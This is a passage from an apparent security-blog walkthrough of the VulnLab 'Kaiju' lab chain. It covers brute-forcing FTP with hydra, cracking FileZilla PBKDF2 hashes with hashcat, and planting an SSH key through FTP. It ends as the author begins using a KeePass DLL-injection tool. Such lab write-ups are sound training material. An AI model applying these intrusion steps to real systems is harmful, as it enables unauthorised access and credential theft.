<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Kaiju VulnLab Chain - Complete Walkthrough &amp; WriteupIntroductionWelcome to this comprehensive writeup and walkthrough of the Kaiju Chain &#x2F; ProLab from VulnLab &#x2F; Hack The Box. This lab te">
<meta property="og:type" content="article">
<meta property="og:title" content="VL-Kaiju">
<meta property="og:url" content="https://panosoikogr.github.io/2025/11/22/VL-Kaiju/index.html">
<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
<meta property="og:description" content="Kaiju VulnLab Chain - Complete Walkthrough &amp; WriteupIntroductionWelcome to this comprehensive writeup and walkthrough of the Kaiju Chain &#x2F; ProLab from VulnLab &#x2F; Hack The Box. This lab te">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://panosoikogr.github.io/images/Kaiju/hash-pass-filezilla.png">
<meta property="og:image" content="https://panosoikogr.github.io/images/Kaiju/filezilla-connection-admin.png">
<meta property="og:image" content="https://panosoikogr.github.io/images/Kaiju/configure-users.png">
<meta property="og:image" content="https://panosoikogr.github.io/images/Kaiju/export-import.png">
<meta property="og:image" content="https://panosoikogr.github.io/images/Kaiju/ftp-access-admin.png">
<meta property="og:image" content="https://panosoikogr.github.io/images/Kaiju/lsa-dump.png">
<meta property="og:image" content="https://panosoikogr.github.io/images/Kaiju/stream-divert.png">
<meta property="og:image" content="https://panosoikogr.github.io/images/Kaiju/certipy-hash.png">
<meta property="article:published_time" content="2025-11-22T17:15:29.000Z">
<meta property="article:modified_time" content="2025-11-22T17:18:01.600Z">
<meta property="article:author" content="Panosoiko">
<meta property="article:tag" content="Chain">
<meta property="article:tag" content="Hack The Box">
<meta property="article:tag" content="ProLab">
<meta property="article:tag" content="VulnLab">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://panosoikogr.github.io/images/Kaiju/hash-pass-filezilla.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>VL-Kaiju</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-73BMC8ZHB7');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 8.0.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writeups</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/11/23/VL-Push/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/11/21/CVE-2025-33073/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/11/22/VL-Kaiju/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/11/22/VL-Kaiju/&text=VL-Kaiju"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/11/22/VL-Kaiju/&title=VL-Kaiju"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/11/22/VL-Kaiju/&is_video=false&description=VL-Kaiju"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=VL-Kaiju&body=Check out this article: https://panosoikogr.github.io/2025/11/22/VL-Kaiju/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/11/22/VL-Kaiju/&title=VL-Kaiju"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/11/22/VL-Kaiju/&title=VL-Kaiju"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/11/22/VL-Kaiju/&title=VL-Kaiju"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/11/22/VL-Kaiju/&title=VL-Kaiju"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/11/22/VL-Kaiju/&name=VL-Kaiju&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/11/22/VL-Kaiju/&t=VL-Kaiju"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Kaiju-VulnLab-Chain-Complete-Walkthrough-Writeup"><span class="toc-number">1.</span> <span class="toc-text">Kaiju VulnLab Chain - Complete Walkthrough &amp; Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Network Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-BERSRV100-kaiju-vl"><span class="toc-number">1.2.1.</span> <span class="toc-text">Nmap Scan - BERSRV100.kaiju.vl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-BERSRV200-kaiju-vl"><span class="toc-number">1.2.2.</span> <span class="toc-text">Nmap Scan - BERSRV200.kaiju.vl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-BERSRV105-kaiju-vl"><span class="toc-number">1.2.3.</span> <span class="toc-text">Nmap Scan - BERSRV105.kaiju.vl</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access-FTP-Exploitation"><span class="toc-number">1.3.</span> <span class="toc-text">Initial Access - FTP Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP-Enumeration"><span class="toc-number">1.3.1.</span> <span class="toc-text">FTP Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FileZilla-User-Configuration"><span class="toc-number">1.3.2.</span> <span class="toc-text">FileZilla User Configuration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Password-Cracking-Backup-User"><span class="toc-number">1.4.</span> <span class="toc-text">Password Cracking - Backup User</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#E-Drive-Exploration"><span class="toc-number">1.5.</span> <span class="toc-text">E:\ Drive Exploration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FileZilla-Admin-Interface-Access"><span class="toc-number">1.6.</span> <span class="toc-text">FileZilla Admin Interface Access</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Installing-FileZilla-Server-1-8-0"><span class="toc-number">1.6.1.</span> <span class="toc-text">Installing FileZilla Server 1.8.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#User-Configuration-Issues"><span class="toc-number">1.6.2.</span> <span class="toc-text">User Configuration Issues</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-Access-via-FTP"><span class="toc-number">1.7.</span> <span class="toc-text">SSH Access via FTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#KeePass-Database-Exploitation"><span class="toc-number">1.8.</span> <span class="toc-text">KeePass Database Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#KeeFarceReborn-Setup"><span class="toc-number">1.8.1.</span> <span class="toc-text">KeeFarceReborn Setup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LSA-Secrets-Dumping"><span class="toc-number">1.9.</span> <span class="toc-text">LSA Secrets Dumping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Active-Directory-Enumeration"><span class="toc-number">1.10.</span> <span class="toc-text">Active Directory Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Certificate-Authority-Enumeration"><span class="toc-number">1.10.1.</span> <span class="toc-text">Certificate Authority Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BloodHound-Enumeration"><span class="toc-number">1.10.2.</span> <span class="toc-text">BloodHound Enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ESC8-Exploitation"><span class="toc-number">1.11.</span> <span class="toc-text">ESC8 Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#StreamDivert-Setup"><span class="toc-number">1.11.1.</span> <span class="toc-text">StreamDivert Setup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Coercion-Attack"><span class="toc-number">1.11.2.</span> <span class="toc-text">Coercion Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM-Relay-to-ADCS"><span class="toc-number">1.11.3.</span> <span class="toc-text">NTLM Relay to ADCS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Certificate-Authentication"><span class="toc-number">1.11.4.</span> <span class="toc-text">Certificate Authentication</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTDS-Dump"><span class="toc-number">1.11.5.</span> <span class="toc-text">NTDS Dump</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Alternative-Path-2-In-Progress"><span class="toc-number">1.12.</span> <span class="toc-text">Alternative Path 2 (In Progress)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Interesting-Resources"><span class="toc-number">1.12.1.</span> <span class="toc-text">Interesting Resources</span></a></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        VL-Kaiju
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Panosoiko</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-11-22T17:15:29.000Z" class="dt-published" itemprop="datePublished">2025-11-22</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Chain/" rel="tag">Chain</a>, <a class="p-category" href="/tags/Hack-The-Box/" rel="tag">Hack The Box</a>, <a class="p-category" href="/tags/ProLab/" rel="tag">ProLab</a>, <a class="p-category" href="/tags/VulnLab/" rel="tag">VulnLab</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="Kaiju-VulnLab-Chain-Complete-Walkthrough-Writeup"><a href="#Kaiju-VulnLab-Chain-Complete-Walkthrough-Writeup" class="headerlink" title="Kaiju VulnLab Chain - Complete Walkthrough &amp; Writeup"></a>Kaiju VulnLab Chain - Complete Walkthrough &amp; Writeup</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Welcome to this comprehensive writeup and walkthrough of the <strong>Kaiju Chain &#x2F; ProLab</strong> from VulnLab &#x2F; Hack The Box. This lab tests your skills in Windows exploitation, Active Directory enumeration, certificate abuse (ESC8), and lateral movement techniques. In this detailed guide, we’ll walk through the complete methodology from initial reconnaissance to full domain compromise, covering FileZilla exploitation, KeePass database extraction, NTLM relay attacks, and ADCS (Active Directory Certificate Services) vulnerabilities.</p>
<p>Whether you’re preparing for OSCP, studying for red team operations, or simply looking to enhance your penetration testing skills, this walkthrough will provide you with practical techniques used in real-world Active Directory environments.</p>
<hr>
<h2 id="Network-Enumeration"><a href="#Network-Enumeration" class="headerlink" title="Network Enumeration"></a>Network Enumeration</h2><p>We begin by mapping out the target infrastructure. The network contains three Windows servers:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.10.187.149 BERSRV100.kaiju.vl</span><br><span class="line">10.10.187.150 BERSRV200.kaiju.vl</span><br><span class="line">10.10.187.151 BERSRV105.kaiju.vl</span><br></pre></td></tr></table></figure>

<h3 id="Nmap-Scan-BERSRV100-kaiju-vl"><a href="#Nmap-Scan-BERSRV100-kaiju-vl" class="headerlink" title="Nmap Scan - BERSRV100.kaiju.vl"></a>Nmap Scan - BERSRV100.kaiju.vl</h3><p>Running an initial Nmap scan against the first server reveals a standard Windows RDP service:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON  VERSION</span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: KAIJU</span><br><span class="line">|   NetBIOS_Domain_Name: KAIJU</span><br><span class="line">|   NetBIOS_Computer_Name: BERSRV100</span><br><span class="line">|   DNS_Domain_Name: kaiju.vl</span><br><span class="line">|   DNS_Computer_Name: BERSRV100.kaiju.vl</span><br></pre></td></tr></table></figure>

<h3 id="Nmap-Scan-BERSRV200-kaiju-vl"><a href="#Nmap-Scan-BERSRV200-kaiju-vl" class="headerlink" title="Nmap Scan - BERSRV200.kaiju.vl"></a>Nmap Scan - BERSRV200.kaiju.vl</h3><p>The second server presents more interesting attack surface with FTP, SSH, and RDP services:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON  VERSION</span><br><span class="line">21/tcp   open  ftp?          syn-ack</span><br><span class="line">| ssl-cert: Subject: commonName=filezilla-server self signed certificate</span><br><span class="line">| Issuer: commonName=filezilla-server self signed certificate</span><br><span class="line">|   Help: </span><br><span class="line">|     220-FileZilla Server 1.8.0</span><br><span class="line">22/tcp   open  ssh           syn-ack OpenSSH for_Windows_8.1 (protocol 2.0)</span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services</span><br><span class="line">|   DNS_Computer_Name: BERSRV200.kaiju.vl</span><br><span class="line">|   DNS_Tree_Name: kaiju.vl</span><br></pre></td></tr></table></figure>

<p>The presence of <strong>FileZilla Server 1.8.0</strong> is particularly interesting and will become our primary entry point.</p>
<h3 id="Nmap-Scan-BERSRV105-kaiju-vl"><a href="#Nmap-Scan-BERSRV105-kaiju-vl" class="headerlink" title="Nmap Scan - BERSRV105.kaiju.vl"></a>Nmap Scan - BERSRV105.kaiju.vl</h3><p>The third server appears to be more restricted:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON  VERSION</span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services</span><br><span class="line">|   DNS_Domain_Name: kaiju.vl</span><br><span class="line">|   DNS_Computer_Name: BERSRV105.kaiju.vl</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Initial-Access-FTP-Exploitation"><a href="#Initial-Access-FTP-Exploitation" class="headerlink" title="Initial Access - FTP Exploitation"></a>Initial Access - FTP Exploitation</h2><p>Probably everything is behind a firewall, so after checking for any vulnerabilities on FileZilla, I decided to brute-force the FTP service using SecLists:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://10.10.170.198</span><br></pre></td></tr></table></figure>

<p>While Hydra didn’t find anything, trying some common combinations for anonymous login, we got through with <code>ftp</code> as the username and no password. </p>
<h3 id="FTP-Enumeration"><a href="#FTP-Enumeration" class="headerlink" title="FTP Enumeration"></a>FTP Enumeration</h3><p>Looking into the FTP directory, we find a lot of interesting files:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x27;FileZilla Server.lnk&#x27;</span><br><span class="line">firewalls.txt</span><br><span class="line">ftp.txt</span><br><span class="line">it.kdbx</span><br><span class="line">local.txt</span><br><span class="line">PuTTY.lnk</span><br><span class="line">users.xml</span><br></pre></td></tr></table></figure>

<p>The <code>firewalls.txt</code> file contains a small password list:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">firewall:firewall123</span><br><span class="line">ftp:ftp</span><br><span class="line">administrator:[Moved to KeePass]</span><br></pre></td></tr></table></figure>

<p>We also obtain the KeePass database file (<code>it.kdbx</code>), and we know it’s KeePass2 from the folder it was stored in, but we couldn’t manage to crack it initially.</p>
<h3 id="FileZilla-User-Configuration"><a href="#FileZilla-User-Configuration" class="headerlink" title="FileZilla User Configuration"></a>FileZilla User Configuration</h3><p>Looking into <code>users.xml</code>, we find the backup user configuration:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;user name=&quot;backup&quot; enabled=&quot;true&quot;&gt;</span><br><span class="line">	&lt;mount_point tvfs_path=&quot;/&quot; access=&quot;1&quot; native_path=&quot;&quot; new_native_path=&quot;E:\Private&quot; recursive=&quot;2&quot; flags=&quot;0&quot; /&gt;</span><br><span class="line">	&lt;rate_limits inbound=&quot;unlimited&quot; outbound=&quot;unlimited&quot; session_inbound=&quot;unlimited&quot; session_outbound=&quot;unlimited&quot; /&gt;</span><br><span class="line">	&lt;allowed_ips&gt;&lt;/allowed_ips&gt;</span><br><span class="line">	&lt;disallowed_ips&gt;&lt;/disallowed_ips&gt;</span><br><span class="line">	&lt;session_open_limits files=&quot;unlimited&quot; directories=&quot;unlimited&quot; /&gt;</span><br><span class="line">	&lt;session_count_limit&gt;unlimited&lt;/session_count_limit&gt;</span><br><span class="line">	&lt;description&gt;&lt;/description&gt;</span><br><span class="line">	&lt;password index=&quot;1&quot;&gt;</span><br><span class="line">		&lt;hash&gt;ZqRNhkBO8d4VYJb0YmF7cJgjECAH43MHdNABkHYjNFU&lt;/hash&gt;</span><br><span class="line">		&lt;salt&gt;aec9Yt49edyEvXkZUinmS52UrwNoNNgoM+6rK3fuFFw&lt;/salt&gt;</span><br><span class="line">		&lt;iterations&gt;100000&lt;/iterations&gt;</span><br><span class="line">	&lt;/password&gt;</span><br><span class="line">	&lt;methods&gt;1&lt;/methods&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Password-Cracking-Backup-User"><a href="#Password-Cracking-Backup-User" class="headerlink" title="Password Cracking - Backup User"></a>Password Cracking - Backup User</h2><p>We can deduce that this is <strong>PBKDF2-HMAC-SHA256</strong>, which corresponds to hashcat mode 10900. Converting the hash to the proper format:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha256:100000:aec9Yt49edyEvXkZUinmS52UrwNoNNgoM+6rK3fuFFw=:ZqRNhkBO8d4VYJb0YmF7cJgjECAH43MHdNABkHYjNFU=</span><br></pre></td></tr></table></figure>

<p>RockYou didn’t crack it, nor did any password list from SecLists. So I created some passwords using the format we saw that the other passwords had, and it cracked!</p>
<p>Custom wordlist entries:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kaiju123</span><br><span class="line">backup123</span><br><span class="line">backup</span><br><span class="line">kaijubackup</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<p><strong>Cracked credentials:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backup:&lt;Password&gt;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="E-Drive-Exploration"><a href="#E-Drive-Exploration" class="headerlink" title="E:\ Drive Exploration"></a>E:\ Drive Exploration</h2><p>We noticed from the XML file that there is an <strong>E:&#x2F;</strong> drive that we can explore, as the C:&#x2F; drive didn’t have anything interesting.</p>
<p>On <code>E:\Program Files\FileZilla Server\</code>, we find the installation log and also the admin password hash for FileZilla:</p>
<p><img src="/images/Kaiju/hash-pass-filezilla.png" alt="FileZilla Admin Hash"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha256:100000:AdRNx7rAs1CEM23S5Zp7NyAQYHcuo2LuevU3pAXKB18:mSbrgj1R6oqMMSk4Qk1TuYTchS5r8Yk3Y5vsBgf2tF8:</span><br></pre></td></tr></table></figure>

<p>Running hashcat again with our custom wordlist:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 10900 -a 0 hash3 kaiju_backup_passwords.txt</span><br></pre></td></tr></table></figure>

<p>Again, it cracks with a very weak password:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kaiju&lt;Password&gt;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="FileZilla-Admin-Interface-Access"><a href="#FileZilla-Admin-Interface-Access" class="headerlink" title="FileZilla Admin Interface Access"></a>FileZilla Admin Interface Access</h2><p>From HackTricks, we know that the admin interface for FileZilla runs on port 14147 by default. We can port forward that port to our machine using SSH:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 14148:localhost:1212 -N backup@BERSRV200.kaiju.vl</span><br></pre></td></tr></table></figure>

<h3 id="Installing-FileZilla-Server-1-8-0"><a href="#Installing-FileZilla-Server-1-8-0" class="headerlink" title="Installing FileZilla Server 1.8.0"></a>Installing FileZilla Server 1.8.0</h3><p>Since we need to install exactly FileZilla Server version 1.8.0 to be able to connect to the admin interface, and the FileZilla website does not allow you to download older versions, I found a .deb package from this website:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.fileeagle.com/software/1788/FileZilla-Server/1.8.0</span><br></pre></td></tr></table></figure>

<p>For anyone interested in checking that it’s clean, here’s the VirusTotal link:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.virustotal.com/gui/file/0f58fcaa5b51f412f752db1071ebcc7822eaa055acfba8df0214a6d280a49084</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kaiju/filezilla-connection-admin.png" alt="FileZilla Admin Connection"></p>
<h3 id="User-Configuration-Issues"><a href="#User-Configuration-Issues" class="headerlink" title="User Configuration Issues"></a>User Configuration Issues</h3><p>We get a couple of errors when trying to configure the users:</p>
<p><img src="/images/Kaiju/configure-users.png" alt="Configure Users Error"></p>
<p>What we can do is export the configuration, change the path of the backup user to the home folder of sasrv200, and we will get write and read access when we connect to the FTP session.</p>
<p><img src="/images/Kaiju/export-import.png" alt="Export and Import Config"></p>
<hr>
<h2 id="SSH-Access-via-FTP"><a href="#SSH-Access-via-FTP" class="headerlink" title="SSH Access via FTP"></a>SSH Access via FTP</h2><p>Connecting to FTP with our modified configuration:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp BERSRV200.kaiju.vl</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kaiju/ftp-access-admin.png" alt="FTP Access as Admin"></p>
<p>Now we create an SSH directory and upload our public key:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir .ssh</span><br></pre></td></tr></table></figure>

<p>Generate an SSH key pair:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t ed25519 -f ./id_ed25519</span><br></pre></td></tr></table></figure>

<p>Put the contents of the <code>.pub</code> file into <code>authorized_keys</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano authorized_keys </span><br></pre></td></tr></table></figure>

<p>Upload the authorized_keys file:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; put authorized_keys </span><br></pre></td></tr></table></figure>

<p>Finally, SSH into the machine:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_ed25519  sasrv200@BERSRV200.kaiju.vl</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="KeePass-Database-Exploitation"><a href="#KeePass-Database-Exploitation" class="headerlink" title="KeePass Database Exploitation"></a>KeePass Database Exploitation</h2><p>Going back to the <code>it.kdbx</code> file, we can see that it won’t crack using traditional methods. After researching, I found a DLL injection technique for KeePass2 that exports the passwords in cleartext.</p>
<p>I initially tried <a target="_blank" rel="noopener" href="https://github.com/denandz/KeeFarce/tree/master">https://github.com/denandz/KeeFarce/tree/master</a>, but it didn’t work.</p>
<p>So I used <strong>KeeFarceReborn</strong> instead: <a target="_blank" rel="noopener" href="https://github.com/d3lb3/KeeFarceReborn">https://github.com/d3lb3/KeeFarceReborn</a></p>
<h3 id="KeeFarceReborn-Setup"><a href="#KeeFarceReborn-Setup" class="headerlink" title="KeeFarceReborn Setup"></a>KeeFarceReborn Setup</h3><p><strong>Step 1:</strong> Change the KeePass configuration at <code>E:\Public\Software\KeePass2\</code></p>
